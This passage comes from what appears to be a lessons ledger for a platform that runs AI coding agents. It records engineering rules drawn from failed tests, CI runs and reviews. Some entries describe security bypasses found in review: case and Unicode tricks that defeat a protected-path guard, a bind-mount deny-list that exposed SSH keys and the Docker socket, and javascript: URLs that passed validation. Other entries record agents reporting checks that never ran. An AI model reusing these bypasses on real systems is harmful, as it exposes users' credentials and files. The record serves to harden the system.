   stream, so one never-handled type permanently halts each aggregate that emits it, signalled only by a
   rising gauge. Completing is safe **because `events` is append-only** (TD-005 `REVOKE DELETE`): only
   the work item dies, and a handler added later is served by a backfill from the log. Rules 9 and 20
   describe this and neither settles it.

72. **A single pass that deletes while it walks is not a delete — and the two filesystems this repository
   runs on disagree about whether you find out.** Reclaiming a control directory an agent had flooded past
   `ARG_MAX`, three delete strategies were tried and **two of them silently left about half the entries**:
   `find "$dir" -mindepth 1 -maxdepth 1 -exec rm -rf {} +` left **3 944 of 8 002**, and a bare `rm -rf $dir`
   left **3 991** — *neither reported an error*. Removing an entry invalidates the directory cursor the walk
   is reading, so the walk skips. A **named volume does not show it; virtiofs does**, which means no unit
   test on this machine could have caught it and the e2e caught both. The shipped form makes the emptiness
   test the loop condition *and* the verdict, bounded at 20 passes. Two orderings only running it could find:
   the unlock must precede the first emptiness question, because a `000` directory answers `ls -A` with
   nothing and "already empty" then skips the removal — that ordering **passed the flood case and failed the
   lock case**; and the verdict must be the last line, or the step exits 0 having done nothing. The whole
   class is rule 3 with a shell in the way: *the step that cannot fail is the step whose failure branch
   nobody executes* — this one ended `exit 0` and reported success while leaving the token in place.
   **It is also rule 27's seventh instance and its sharpest**: the orchestrator's prescription failed *and*
   so did the reviewer's alternative *and* so did the implementer's own first replacement. Three informed
   guesses, one measurement, and only the measurement was right.

71. **A failure you have fixed is a failure you can finally see past — and local green can rest on
   several independent environment differences at once, each invisible until the one in front of it is
   gone.** CI's `e2e-fake-claude` job died at `mkdir: Permission denied` for six pushes. Fixing that revealed
   a **second** clean-environment defect underneath (`POST /containers/create` answers **404 `No such image`**
   and a create through the engine API **never pulls**; `RUNTIME_IMAGE` was *assumed*, while `ALPINE_IMAGE`
   and `GIT_IMAGE` reached the daemon through the **CLI**, which pulls — luck, not design), which took out
   21 tests and a whole suite. Fixing *that* revealed a **third** (`nslookup egress-<run>` exiting 1). Three
   independent reasons the local run could not have found any of them: a bind mount reports `0 0` for a host
   directory owned by uid 501, so a helper always appears to own it; this machine's daemon has every image
   cached; and a developer machine has no `search` line in `resolv.conf` while a cloud runner's host does and
   Docker copies it in. **None is a bug in the product and all three hid one.** The lesson is not "run CI" —
   it is that *the number of environment differences is unknown until each is removed*, so the first green
   run after a long red streak is the first honest measurement, not the end of the work. Rule 4's instrument
   audit applied to the **environment** rather than to the harness.
70. **Redacting a value that is used as a *key* trades a leak for a collision, and the collision is the
   worse failure.** A placeholder is many-to-one by construction, so the moment a redacted string becomes
   identity material two distinct requests can become one: measured on the slack branch, two secrets sharing
   a placeholder name collapsed two idempotency keys into one and the second caller was handed **the first
   request's result**, told it was its own — `store.keys().length === 1`, the second `perform` never ran.
   Round 2 redacted the key; round 3 **reversed** it, because the answer is not a better redactor but
   refusing identity material that needs redacting at all, and letting the audit row BD-003 already obliges
   take the fidelity loss instead. **And the mirrored case has the opposite answer, which is rule 20 and not
   an inconsistency**: refusing an *outbound* mutation costs one action loudly before anything reaches the
   provider (fail closed), while refusing an *inbound* delivery drops an event the platform has already been
   told about (fail open) — so the webhook delivery key still redacts, with its residual stated (two
   deliveries differing only inside the same credential collapse, and the **first** wins). The third option,
   a one-way digest, preserves distinctness where a placeholder cannot, and was measured and filed rather
   than taken: unkeyed it does not store "no secret" at `MIN_SECRET_LENGTH` 8, and the only key an inbound
   adapter holds is nullable on GitLab, which would make the property hold on some bindings and silently
   weaken on others (rule 18).

69. **A target that is green on the developer's platform is not green on the platform CI runs — and the
   ledger recorded "main is green on all five targets" for six consecutive pushes while the repository's own
   gate was red.** `verify:e2e` passes here on macOS/Docker Desktop and has failed on `ubuntu-latest` since
   **WP-14's own merge** (`34509491314`, 2026-09-10T17:38) with
   `mkdir: can't create directory '/ctl/<uuid>': Permission denied` — six red runs, the whole of WP-15 and
   its follow-ups pushed on top of a red gate. Every other job in the run is green, so nothing *else* was
   wrong; the one job that exercises container isolation on a real Linux kernel is the one that failed, which
   is precisely the job whose result cannot be obtained locally. The mechanism (uid/gid mapping across
   Docker Desktop's file sharing versus native Linux) is a **hypothesis for the ci-fix to measure**, not a
   finding. Two orchestrator failures let it run: the protocol's "check `gh run list` every 5 WPs" was not
   run between WP-14 and WP-15a, and *five local targets were reported as the state of `main`* when the
   authoritative gate is CI. **Anything touching the filesystem, uid mapping or a network namespace has its
   real verdict on Linux; the local run is the weaker evidence, and `gh run list` is part of "verify after
   every merge".**

1. **A fake may be stricter than the real adapter, never kinder.** Every later WP's unit tier trusts the
   fake, so one that admits what production blocks, or fires earlier than production, launders a bug into a
   pass. Four such divergences were found in the pg-boss fake alone, three in the dangerous direction. Write
   every deliberate difference down where the fake is defined.
2. **A wall-clock assertion is a hardware assertion, not a correctness one.** CI is a 2-core runner. Property
   tests carry `PROPERTY_TEST_TIMEOUT_MS` (30s) and a pinned `MODEL_RUNS`.
3. **An invariant asserted in a comment, an error message or `.env.example` is not evidence it holds** — and
   a test that would pass whether or not the behaviour is present is not a test of it. **Mutation-check every
   guard**: reverting it must fail its test, by a named assertion rather than a timeout.
4. **When a defect keeps returning one layer down, stop fixing the code and audit the instrument.** Ask of
   every fake: is it kinder than the real thing, and can it even *reach* the state my assertion is about? A
   positive assertion fails loudly on a broken harness; a negative one passes silently on the same wreckage.
5. **A differential result is evidence about the corpus, not the program**, and whoever built the corpus is
   the worst judge of what it omits. Two independent corpora disagreed by 3,624 verdicts.
6. **Green in a worktree is not green on `main`.** Re-run all five targets after every merge, before writing
   the commit. Watch for a WP adding a *required* field to a shared type, or a runtime invariant that will
   not fail typecheck at all.
7. **A guard with a hand-maintained scope drifts.** Ask git what it tracks; do not carry your own list.
   Corollary earned at WP-06a round 2: *fixing a hand-maintained list by adding a second hand-maintained
   list does not discharge this rule* — `check-ignored.mjs` closed its missing-root gap by adding
   `IGNORABLE_ROOT_FILES`, an **allow-list that suppresses failures**, so its drift is silent and in the
   dangerous direction.
8. **Docs win over code.** When implementation proves a doc wrong, amend the doc first, then point at it.
   TD-004, technical/02, technical/03, technical/12, BD-007 and product/04 were all amended this way.
9. **An obligation two paths can each discharge needs an explicit arbiter — and the rule has two
   directions.** *Over*-discharge is the sixth layer of the WP-06a defect: two paths each correctly writing
   "the client has been told" is not two correct paths, it is an unsynchronised shared flag with no flag.
   Its **dual is a distinct class that the first half would not catch**: an arbiter *consumed* by a path
   that did not perform the obligation, so nobody discharges it — WP-06a's `retry:` was suppressed by the
   `first` flag being spent on frames the `partials` filter had already dropped. State both directions.
10. **A test whose assertion is satisfied by every branch must also assert which branch ran**, or it certifies
   the observable and not the code. `hub.test.ts:817` asserted `shutdown@-` last — true down either route —
   and never asserted the `reset` that only one route writes.
11. **A register entry that justifies a kindness by pointing at a test elsewhere must name a test that
   exists.** All five WP-07 fakes justified "no quota unless scripted" with "the scripted path is what the
   executor's tests drive"; nothing anywhere composed a fake with the executor. A justification is a claim
   about the suite, and claims about the suite are checkable.
12. **A fake's kindest divergence needs a positive assertion, not a warning.** Documenting a divergence is
   necessary and not sufficient: the place a fake is most permissive is the place a later WP leans hardest.
   Hard-coding `mergeable: true` in the WP-07 git fake passed 39/39 unit and contract tests.
13. **A redactor is only as good as the consumer that serialises what it missed, so review it against the
   real serialiser.** WP-07's `redactErrorInPlace` was verified against `pino-std-serializers@7.1.0`'s
   actual `lib/err.js` and leaked four ways: own enumerable fields (`err.js:29-38` copies every `for…in`
   key), `AggregateError.errors[]` (`err.js:24-26`), and any `cause` chain past its own depth bound —
   because pino's `messageWithCauses` walks the chain **unbounded**. *A bound the consumer does not share
   is not a safety property.*
14. **A guard enforced only by TypeScript is not enforced at a boundary.** WP-07's shadow guard was made
   required in the type and probed live: a JavaScript caller omitting `mode`, or passing `'SHADOW'` for
   `'shadow'`, got `status: ok` and a **real** provider call. A mutation that dies as `TS2578` proves the
   compiler, not the code — mutation-check a runtime guard from JavaScript.
15. **A guard that matches paths as strings inherits the filesystem's equivalence classes, not its own.**
   Case and unicode normalisation decide whether a protected path is protected. WP-12's path guard returned
   `allow` for `.ENV` against a `.env` rule, and the reviewer wrote `.ENV` on APFS and **overwrote `.env`**.
   Case-folding costs a false deny on a genuinely case-sensitive filesystem, which is the fail-closed
   direction, so take it.
27. **Measure a prescribed fix before applying it — three times this session a reviewer's or orchestrator's
   proposed patch was wrong, and each time the implementer who measured it caught something.** WP-06a: the
   proposed `#queued >= cap + replayOutstanding` was *algebraically identical* to the broken gate and closed
   at the same frame. WP-06a round 2: the proposed arbitration flag closed only one direction, and had to be
   claimed before `abandon()`'s `reset`s rather than before its `shutdown`. WP-12 round 3: the prescribed
   whole-string `NFKC` fold maps **U+FF0F to `/`**, which the volume does not — so `src/*.ts` would have
   answered `allow` for `src/a／b.ts`, turning a fail-closed widening into a fail-**open** one. Per-segment
   folding pins it. *A fix arriving with authority is still a hypothesis.*

   **Fourth and fifth instances, and the fifth changed the shape of the rule.** WP-20: my brief prescribed
   `safeHref(...) ?? undefined` *and* forbade `href=` outside `untrusted.tsx` — two instructions that cannot
   both be obeyed, since the first leaves `href=` in five files; the implementer measured the contradiction
   and shipped an `ExternalLink` component instead. Then the redaction follow-up: I prescribed widening
   `redactJson` to cover keys, and the implementer **declined, citing rule 41 back at me** — widening the
   shared walk would take collision accounting away from the two sites that have it (Loki counts a colliding
   label into its truncation marker; a shared walk has nowhere to report one) and would leave Loki's own pass
   as a second, untestable guard. It redacted at the emitting site and narrowed the docblock's claim instead.
   That is the first time a prescription was refused *by argument from the ledger* rather than by
   measurement, which is the outcome the ledger exists for: **the standing rules are the implementer's
   authority to say no to me, and an implementer that only ever complies is not using them.** A brief should
   therefore state the *defect* and the *evidence*, and hold its prescribed patch loosely — I have now been
   wrong about the patch five times and right about the defect every time.

   **Sixth instance, and it came from a reviewer rather than from me.** The ci-fix review prescribed
   `chown -R 0:0 $dir && chmod -R u+rwX $dir` before `rm -rf` to reclaim a control directory an agent had
   locked. The implementer measured it: **`chown -R` must open a directory to walk it**, so with
   `CAP_CHOWN` only it exits 1 on all three agent moves and the token survives; plain `rm -rf` with
   **`CAP_DAC_OVERRIDE`** exits 0 on all three. The prescription was not merely suboptimal, it did not
   work. Six wrong patches, zero wrong defects.
26. **`toLowerCase()` is lowercase *mapping*; a filesystem compares with full case *folding* — and the way
   to learn its equivalence classes is to ask it, not to reason about Unicode.** WP-12's round-1 fix folded
   with `normalize('NFC').toLowerCase()`; the reviewer wrote `conﬁg/app.yaml` (U+FB01) on APFS and it
   **overwrote `config/app.yaml`** — same inode — while the guard returned `allow`. Same for `ſecrets`
   (U+017F), `ſrc`, and `aßets` (`straße` ≡ `strasse`, same inode). The fix is `NFKC` plus an explicit
   `ß → ss`; both only widen, so both fail closed. **The instrument is the transferable part:** a
   filesystem-differential test that creates the files and compares inodes cannot drift from the filesystem
   the way an argument about Unicode can. Sharpens rule 15.
   **Sharpened again at round 3: do not reason about the classes, *enumerate* them — and then accept that a
   string fold can only ever approximate a filesystem's.** Writing every code point into one directory and
   grouping by inode found **1906 equivalence classes** across the BMP and plane 1, and named the **43** the
   fix still misses. Reasoning had found four. But the census also found the *cause*, which is worth more
   than the list: `toLowerCase()` reads the case table of the running **Node/ICU** build, while the volume
   compares with the case table baked into **the OS release**, and those version independently. Every miss is
   a recently-encoded cased letter (U+A7CF/D3/D5; the contiguous plane-1 run U+16EBB–U+16ED3), so the gap
   **re-opens on every Node or macOS Unicode bump, in whichever direction is ahead** — a hard-coded table of
   the 43 would be stale by the next one. *State the guarantee over the classes that fold onto an **ASCII**
   name*, which is what a protected-path list is written in (every example in technical/12 and the shipped
   `FLAGGED_CONFIG_PATHS`) and which the census confirms holds without exception; treat anything wider as
   best-effort and expect it to drift. All 43 misses are non-ASCII↔non-ASCII, so the ASCII guarantee is
   provably complete on this volume.
29. **A counter a suite uses to decide which branch ran must itself be proved live.** WP-10 added
   `providerCalls()` to the shared suite precisely to fix a rule-10 failure — and mutating the harness to
   `providerCalls: () => 0` left **2335 of 2335 tests green**, because the suite only asserted the counter
   *had not moved*. Capture a baseline, assert it increased, and only then assert it did not increase again.
   This is rule 10 one level up, and it bit the fix for rule 10.
31. **An optional security dependency is an absent one.** WP-11's providers take a `redactor` as an
   optional option and `ProviderCreateInput` has no field for one, so in the **only production path**
   `redact.apply` is the identity function — a scripted Loki response returned
   `line = "Authorization: Bearer <token>"` verbatim, and the executor does not close it (`action-executor.ts:663`
   returns the raw `result`; only the audit row is redacted). WP-07 had already made its own redactor
   **required, never defaulted**, for exactly this reason; WP-11 reintroduced the defect one ring out. If a
   guarantee needs an injected collaborator, the type must **require** it, and the composition root that
   builds it in production must be the thing the tests drive.
33. **A guard shipped as a `scripts/*.mjs` verify step has no test tier of its own, so mutating the guard
   passes the whole suite.** Changing WP-10's NUL guard from `indexOf(0)` to `indexOf(0, 1)` — blind to a
   NUL at byte 0 — left **all 2353 tests green**. Manual canaries are evidence that expires when the session
   does. `scripts/check-ignored.test.ts` is the precedent: give every executable guard a real test.
37. **A cap audit that lists the fields it capped is not a sweep of the fields it emits — enumerate the
   output type's members, not the call sites.** Three WP-11 rounds capped a breadcrumb's `message` and never
   looked at `category` and `level` sitting beside it in the same object, both `z.string().nullish()`.
   Measured with 2 MB fields: **100,027,762 bytes** out at the shipped defaults
   (`max_breadcrumbs = 25`, `max_breadcrumb_bytes = 1024`) — `message` correctly cut, the other two through
   at 2,000,000 each, no marker and nothing setting `truncated`. *The figure first recorded here, 200,106,301,
   was taken at doubled caps and did not reproduce; see rule 39.* Round 3's own audit
   claim — "the one string routing around every cap was Sentry's health probe" — was false when a reviewer
   enumerated the *type* instead of the call sites.
39. **A measurement quoted as evidence must reproduce from the shipped defaults, and the test that ships
   with it must pin the number.** WP-11a's headline "200,106,401 bytes at the shipped defaults" was taken at
   *doubled* caps; at the real defaults it is **100,027,762** — a figure now *produced* by the shipped test rather than quoted. The figure had already been copied into two
   docblocks, a commit message, `docs/technical/06` and **this ledger's rule 37** before anyone re-ran it.
   The defect was entirely real and the number was not, which is the combination that survives review — a
   wrong number attached to a true finding is never the thing under scrutiny. This is the **second** figure
   this session to need correcting after the fact (rule 32's was 128, measured 192).
41. **A value bounded twice has two untestable guards.** WP-11a found `issue.id` capped in both `mapIssue`
   and `issueUrl`; neither mutation could be made to fail, because the other guard caught it. It is rule 22's
   shape without the layering being deliberate — and the fix is not a comment but a single source: `issueUrl`
   now takes the already-bounded id.
44. **A "this is the only place X happens" docblock must be enforced by the same check that enforces X, or
   it is decoration.** WP-20's `untrusted-text.ts` claimed to be the only producer of an `href`; five other
   sites put a DTO string straight into one, and `urlSchema = z.url()` **accepts** `javascript:`, `data:`,
   `vbscript:` and `file:`. The only thing preventing execution was **React 19.3 rewriting the attribute** —
   an accidental defence that nothing asserted, dependent on a framework version. A scope claim is a
   checkable claim (rules 17, 30, 33).
49. **When you fix a liveness test, grep for its siblings.** WP-13's `cred.get` guard tested `child === null`,
   which is never true after `spawn`. Fixing it, the implementer found **`beginShutdown` testing liveness the
   same way** — a runner dropping after the child exited left the shim listening for ever. One defect, two
   functions, one review round apart. The same sweep also found both concurrency caps had **no test at all**
   (deleting either left 113/113 green) while being claimed by the docblock *and* by Q44.
50. **A flush window must bound *silence*, not the drain.** WP-13's 16 MiB conformance test was flaky 2 in
   10 because its window bounded how long the drain *ran* rather than how long it had been *quiet*, losing
   exactly 65,536 bytes — one pipe buffer, `result` line included. A timer that starts once measures the
   wrong thing; re-arm it on progress. **Verified**: the mutation dies, and the re-arm's own cost is stated —
   a grandchild dribbling faster than the window keeps the shim alive, bounded externally by a control
   disconnect.
68. **A mechanism with two symmetric halves gets one test, and the tested half makes the untested half look
   covered.** WP-15's convergence detector escalates a task when a stage returns the same findings twice.
   The **CI** half has a named test — *stops after three identical failures instead of burning the loop*.
   The **code-review** half has none: inserting `return false;` before `recentStageSignatures` disables the
   escalation entirely and **all 3659 unit+contract tests stay green**. `recentStageSignatures`,
   `isRepeatOfPreviousRound` and the `escalateTask` block are all zero-hit. Nobody would ship a detector
   with no test at all; what actually happens is that one half gets written, the mechanism reads as tested,
   and the second half is never noticed as missing — *especially* by the author, who has just proved the
   idea works. **When a behaviour is parameterised over a set — stages, providers, event types — the test
   must be parameterised over the same set, or the set is decoration.** Sharpest form of rule 37: enumerate
   what you *branch on*, not what you remembered to cover.
67. **The defect you fixed and the test that proves it are two deliverables, and finding the defect makes
   the second one feel done.** WP-15 found a real product defect by running the loop — a convergence
   signature in `task_stages.outcome` overwritten by the very transition it exists to stop — diagnosed it
   correctly, fixed it correctly, and wrote it up. The escalation that the signature exists to trigger is
   executed by **no test in any tier**, so the fix is held in place by nothing. The same round left the CI
   gate's failure branch untested while it **fails open**: settling `CI_TERMINAL_FAIL` as `{passed: true}`
   left 3659 tests green, and `ci_gate` is a builtin whose job polls `pipelineStatus` in production
   regardless of its `on` event — so a bug there advances a task to code review **on red CI**. That is the
   fourth fail-open guard this session (WP-07's shadow guard, WP-12's two, now this), and the pattern is
   worth naming: *a guard is written on the happy path and reviewed on the happy path, so its refusal is the
   part nobody executes.* Mutate every guard to succeed and see which tests notice.
66. **The orchestrator's parallelism is a load on somebody's actual machine, and the machine gets a vote.**
   The user reported **two kernel panics on 2026-09-10** — `watchdog timeout: no checkins from watchdogd in
   92 seconds` — with reboots at **12:45 and 17:06**. The 17:06 one is the "restart" this ledger recorded as
   a routine boot; it was not. Causation is **not** established and may be unrelated. What is established,
   and is enough to change behaviour:

   - This is a **14-core** machine, and **Docker Desktop's VM is allocated 12 of those cores.** Host-side
     `vitest` across several worktrees therefore contends for ~2 cores against a VM holding 12.
   - Load averages of **137–196** were driven by this session — 10–14x oversubscription — including
     4 h 37 m at load 137 from the 48 spinners rule 25 records.
   - `apfsd`, the APFS daemon, **exceeded its CPU resource limit 16:05:47–16:08:40**, during a `verify` on
     `main` run while two agents were running Docker e2e suites.
   - The Docker VM tripped a **disk-writes** diagnostic over 19:07–19:20, during the WP-14 e2e verification.
   - It is **not** memory: 36 GB, 73% free, **zero swap in use**.

   `watchdogd` is a high-priority userspace daemon the kernel panics on purpose when it cannot be scheduled,
   so starvation under extreme oversubscription is a plausible mechanism — plausible, not proven.

   **Standing policy from here, which costs throughput on purpose:** at most **two** agents, and **one** when
   any agent is running Docker or the e2e tier; **never** generate synthetic load, for any measurement (rule
   64's figures are to be cited from the round that took them, labelled, rather than re-measured); agents
   iterate with targeted test files and run the six targets once at the end; merged worktrees are removed
   immediately, because each is a full checkout that multiplies both the filesystem scan and the vitest
   collection. **A green build on a machine you made unusable is not a good trade, and the person whose
   laptop it is did not sign up for the experiment.**
65. **An oracle that audits a parser must *over*-approximate it; where the two share a shape, they are one
   guard.** WP-14 replaced a loose `MINIMUM_CITATIONS` floor with a per-site recall check — a second regex
   (`CITATION_SITE`) that finds everything *looking like* a citation, so the parser can be held to reading
   all of them. It is genuinely independent of the scanning (it caught the mutation modelling round 2's
   bug), and it still shares **one** assumption with the parser it audits: both require the backticked file
   token and the `›` on the same *physical* line. Measured: a fabrication wrapped **between** the file token
   and the marker is read by neither, and the recall check reports nothing at all — suite still 12 passed,
   sites still 18, failures `[]`. **A second expression of the same idea agrees with the first precisely
   when both are wrong**, and the shape they share is the one that will fail next. Design the oracle to be
   *deliberately sloppier* than the thing it checks, so an unreadable spelling becomes a loud *unread site*
   rather than silence — and when you cannot, list the shared shape in the docblock's gap list, which this
   one omits.
64. **A wall-clock margin must be measured at the load the fleet actually runs at, or it is not a number.**
   `loki/index.test.ts`'s million-iteration census against the 5 s default: **1.07 s** standalone (4.6x
   margin), **1197/1287/1493 ms** inside a full parallel unit+contract run at load average 5–13,
   **2488/3638/3339 ms** at LA ~36 (73% of the budget), and **timed out 3 of 3** at LA ≥ 110. One number,
   four verdicts. `sentry/mapping.test.ts`'s `mapBreadcrumbs` census timed out in the same heavy run, so it
   is a class and not a file. Rule 57's companion: rule 57 says place the bound by measuring where the value
   lands; this says **state the load at which you measured it**, because the orchestrator's own parallelism
   moves the distribution and this session has run three worktrees at LA 137.
63. **"Only X does this" survives the change that falsifies it.** The redaction round fixed Jira's
   provider-chosen keys and GitLab's header names — and left `loki/provider.ts` still claiming Loki is *the
   only* provider in this repository whose object keys come from the provider, and `redaction.ts` still
   claiming *"two sites owe it today"* when the same commit made three. An exclusivity claim is a statement
   about every *other* file, so it cannot be maintained from inside the file that makes it: **when you close
   one, grep for every other place that repeats it.** Rules 44 and 49 together, and the WP that exists to
   fix false claims made two new ones on its way past.
62. **A `FAIL` line naming a *file* is not a `FAIL` line naming a *test*.** The reviewer's own mutation
   harness classified a **broken mutant** — a trailing comma inside parentheses, which does not parse — as
   DEAD, because vitest prints a collection error as `` FAIL |unit| <file> [ <file> ] `` and a naive
   `startswith(' FAIL')` counts that as a named kill. The predicate must require the `` > `` separator that
   only a real test name carries. This is rule 21's instrument error in its **third** spelling
   (`--reporter=basic` twice, now this one): *a mutation harness reports what it can parse, and what it
   cannot parse it reports as whatever its default branch says* — which is why the canary is not optional
   and why "all mutants died" is a claim about the harness before it is a claim about the tests.
61. **A reported figure must be the target's *verdict*, not a count taken from its output — and the
   orchestrator's job is to produce that verdict itself.** WP-14 round 2 reported "verify PASS (3405)". The
   count was **correct**: the run really did execute 3405 tests. The run also **failed** — `1 failed | 3404
   passed`, `FAIL: verify`. A wrong number is easy to catch because it contradicts something; a right number
   attached to a wrong verdict contradicts nothing, and it reads as *more* credible than a bare "PASS"
   because it carries evidence. This is rule 39 one turn further: the measurement was real and the
   conclusion was not.

   **The orchestrator failure that let it through is the part worth keeping.** The protocol's standing
   instruction is *verify independently in your own shell before every review and after every merge*. For the
   redaction branch I did — six targets, in my own shell, before briefing the reviewer. For WP-14 I read a
   confident report and spawned the review straight off it, and **a full review round was spent on a red
   branch** discovering what one command would have told me in ninety seconds. The rule I keep re-learning is
   not "distrust the report" — the report was written in good faith and its three substantive fixes were all
   genuine. It is that **a verification step skipped once is not a step that runs 90% of the time; it is the
   step that is missing exactly when a report is confident enough to make skipping it feel safe.**

   **Refined at WP-15e (session 5), from an implementer's own report against itself, which is the form
   this rule is most useful in.** Two admissions, quoted in the WP-15e notes under "For the orchestrator":
   a parameter-property construct that `tsc` accepts and Node's strip-only loader refuses was caught only
   by the runlet contract suite (which starts the real shim) and was **twice misread as machine load**
   before being read as a failure; and a `git stash` "confirmation" the implementer *described* in its
   working notes **never ran**. The first is rule 64's shape in reverse — under a machine policy that
   teaches agents to expect load-induced failures, a real failure gets filed as load, and the remedy is
   the one rule 62 gives: read the failing *test's name and message* before classifying, because a
   timeout and a syntax error do not print the same line. The second is this rule's own shape one step
   earlier than the orchestrator: a step written down as done in the middle of the work is as absent as
   one skipped, and it is the more dangerous of the two because the writer believes it. Both were caught
   by the implementer and reported, which is the behaviour the ledger exists to produce; recorded here so
   the next agent recognises the two shapes in itself.
60. **A resource identified only by its name is invisible to a label sweep, and "keep when unlabelled" makes
   that invisibility permanent.** Measured: one `verify:e2e` run leaves exactly one `ws-<uuid>` volume with
   `labels=map[]`, matching neither the `com.agentic.run` label filter nor any name filter the cleanup uses
   — Docker auto-creates it when a purged volume is re-mounted, so nothing ever labelled it. Production is
   safe today only because the provider always creates the volume *with* labels before a container
   references the name. The sharp half: `retentionDecision` classifies an unlabelled volume as
   `keep`/`unlabelled` **for ever**, by design, so the one shape a sweep cannot see is also the one shape
   reclamation refuses to touch. Fix the sweep, never the retention rule.
59. **A guard that reads the repository's own sources has itself inside its scope, and that is where it
   fails first.** WP-14 shipped a citation checker to convert rule 11 into a check — and its only four
   failures on `main` were the example citations in *its own* docblock and *its own* test, which write the
   bare basename `fake.test.ts`, ambiguous across six tracked files. The author's file is not exempt from
   the sweep, and a guard whose examples cannot pass it has not been run against the tree yet.
58. **A line-scoped parser has no recall over a wrapped line, and this repository wraps prose at 100
   characters.** The two citations `provider.ts:36` advertises as *"resolved mechanically"* are precisely
   the two the parser cannot see, because each quoted test name crosses a `` * ``-prefixed continuation.
   Measured: of 21 citations found tree-wide, **zero** come from that file; planting a single-line
   fabrication and a wrapped one took the sweep 21 → 23 and reported only the single-line one. Rule 44's
   shape *inside the fix for rule 11* — a claim of enforcement the enforcing check does not cover — and
   rule 48's corollary: **when you ship a syntactic guard, plant an instance in the shape the repository
   actually writes, not the shape the grammar section shows.** A check with a recall hole is worse than the
   prose it replaced, because it looks safe.
57. **A margin that looks generous is a coin flip until you measure where the value lands.** WP-13's
   backpressure conformance test asserted the runner held `< BULK_BYTES / 2` — 8,388,608 of 16 MiB, which
   reads as a 2x safety margin. Measured, the count landed at **8,192,000 / 8,323,072 / 8,388,608**: the
   bound was drawn *through the middle of the distribution it was measuring*, and the test failed **5 runs
   in 10** on `main`. The cause was upstream of the bound — the test paused 1 MiB into the bulk, and one
   20 ms poll tick of a unix socket carries about **7 MiB**, so "pause once it is unmistakably flowing"
   arrived ~8 MiB late every time. Pausing *before* the bulk moved the landing point to **262,144 bytes**,
   identical in 5 runs of 5. **A fraction of a total is not a margin; the distance from the measured
   distribution is.** And the fix belonged at the thing that set the value, not at the number in the
   assertion — raising the bound would have hidden a 7 MiB scheduling window instead of closing it.
56. **A boolean from a transport-mediated API conflates "not ready" with "failed", and a test that reads it
   as a health check will blame the wrong component.** `SpawnedProcess.kill()` returns
   `state.connection?.send(...) ?? false`, so `false` means **the control connection was not up yet**. The
   conformance test slept 300 ms and asserted `kill(...) === true`, which reads as "the child is alive" and
   is not: it failed on `main` at load average 150 with the child perfectly healthy, and the failure
   message (`expected false to be true`) points at the child rather than at the socket. The replacement is
   a lower bound on something structural — the child's `--pid-file` appearing — and it is *stronger* than
   "connected", because the child can only write that file after the shim received the `spawn` frame over
   the very connection `kill()` is about to use. **Ask what the false branch of a boolean actually
   enumerates before asserting on it.**
55. **A deny-list of paths is a claim about the platform's symlink layout, not about the author's intent.**
   WP-14's `assertSafeBindSource` blocks `FORBIDDEN_BIND_ROOTS` = `/etc`, `/var/run`, `/run`. On this
   platform all three are **symlinks**, so they are refused by the *symlink* branch and the forbidden branch
   never fires at all — while the two paths that actually hand over the machine are each their own realpath
   and pass. Measured: `$HOME` accepted, bound at `/repo`, and from inside the workspace container (uid 1000,
   every hardening flag on) the reviewer read `id_ed25519` (432 B), `id_rsa` (3243 B) and
   `.docker/config.json` (649 B); `~/.docker/run/docker.sock` accepted, daemon recorded
   `bind /run/host-services/docker.proxy.sock → /repo`. Every flag in rule 47's list was on and none of them
   mattered. **Test a deny-list against realpaths on the platform it runs on** — and prefer an allow-condition
   with a positive marker (here: the directory must contain `pnpm-workspace.yaml`). Rule 15's shape, applied
   to filesystem policy rather than to filename equality.
54. **"Either it returns a handle or it leaves nothing behind" is a property of the composition root, not of
   the adapter.** WP-14's `create` discharges that guarantee correctly and its docblock says so truthfully.
   `startRun` then composes `create` with `attach` — and its `catch` revokes the credential and rethrows
   **without destroying the container `create` just started**, reopening exactly the gap `create` closed.
   Measured with the fake: `mirror → create`, `isRunning(runId) === true`, no `stop`, no `remove`, and no
   handle ever reaching a caller who could destroy it; nothing reaps orphans, since `purgeExpired` removes
   volumes only. The docblock's "no path out of this class leaves a container running" was true *of the
   class* and false *of the program*. **When an adapter guarantees atomicity, review the caller that extends
   its transaction** — the guarantee ends at the boundary the docblock is written on, and the next layer up
   inherits the obligation without inheriting the sentence.
53. **A verification run must be scoped to the checkout it claims to verify.** `vitest.config.ts` gives the
   integration and e2e projects `include: ['**/*.integration.test.ts']` and `['**/*.e2e.test.ts']`; those
   leading `**` globs reach into `.claude/worktrees/`, where this repository's own agent worktrees live —
   **separate checkouts of the same repository**. Measured on `main` with three worktrees present:
   `e2e-fake-claude` collected **9 files, 7 of them another agent's**; `integration` collected **48, of which
   36 were**. The run failed, and every failure was an in-progress `docker-workspace.e2e.test.ts` belonging
   to WP-14. The error direction is a false *failure*, which is the safe one — but a green run on this
   machine was not a statement about this checkout, and **CI never saw it because a clean checkout has no
   nested worktrees**. This is `check-ignored.mjs`'s WP-06a defect exactly, in a different tool: *anything
   that walks the tree must be told that a directory holding a `.git` entry belongs to someone else.*
   The orchestrator's own parallelism is what puts those checkouts inside the repository, so it is the
   orchestrator's tooling that keeps meeting this.
52. **A defect in a file no check reads survives every gate — and the repository's own instructions are
   such a file.** The WP-13 squash merge (`d1e7b69`) put **merge-conflict markers into `CLAUDE.md`** and
   they sat on `main` for about an hour. `verify` does not read `CLAUDE.md`, no lint or typecheck covers
   markdown, gitleaks does not care, and the worktree merge commit used `--no-verify`. They were found only
   because a subagent happened to open the file for its own work — by luck, on the document every future
   agent is handed as authoritative. *The orchestrator's own merges are the least reviewed changes in the
   repository*: no implementer wrote them, no reviewer read them, and the conflict resolution is done under
   time pressure between two other things. `conflict:check` now runs in `verify`, because rule 30 says
   writing this down would not have been enough.
51. **`process.exit()` abandons what a socket still owes — and the condition that exposes it is the one
   backpressure normally prevents.** This rule took three attempts to state correctly, which is the useful
   part. WP-13 first reported `process.exit(0)` delivering **8,192 of 16,777,216 bytes**; the round-2
   reviewer could not reproduce it at all (restoring `process.exit(0)` left 142/142 green, and six runs with
   a slow reader and a stalling runner delivered **every byte either way**), and the orchestrator had already
   promoted the unverified figure into a standing rule. The third attempt found **why both were right**:
   the shim's backpressure normally keeps the userland queue *empty* at shutdown — the socket fills, the
   child's stdout pauses, the child cannot finish, so the run cannot end — which is exactly why a slow reader
   loses nothing. **The queue is non-empty only when the child *ends* while the socket is backed up**, which
   `exit` permits because it does not wait for a pipe. Reproduced against the real entrypoint: shipped
   delivers **64 of 64** tail bytes and the `exit` frame; `process.exit(0)` delivers **0 of 64 and no `exit`
   frame at all** — a runner never told the run ended, which is worse than losing bytes. The test needs bulk
   on **stderr** to saturate the socket and the tail on **stdout** so it is not queued behind it in the
